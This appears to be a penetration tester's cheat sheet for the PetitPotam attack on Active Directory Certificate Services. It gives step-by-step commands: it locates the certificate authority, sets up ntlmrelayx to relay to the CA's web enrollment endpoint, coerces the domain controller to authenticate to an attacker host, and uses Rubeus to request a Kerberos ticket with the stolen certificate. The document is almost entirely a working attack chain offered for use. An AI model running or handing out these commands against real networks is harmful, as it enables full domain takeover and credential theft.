### source
https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1  
https://github.com/topotam/PetitPotam  

### find certificate autthority
```
certutil.exe
```

### set up ntlm relay (forward incoming authentication from domain controller to certificate authority)
```
python3 ntlmrelayx.py -t http://<certificateAuthority>/certsrv/certfnsh.asp -smb2support --adcs
```

### trigger authentication from domain controller
```
Invoke-Petitpotam -Target <domainController> -CaptureHost <lhost>
```

### request kerberos TGT
```
Rubeus.exe asktgt /outfile:<file> /user:<domainController> /ptt /certificate:<base64Certificate>
```

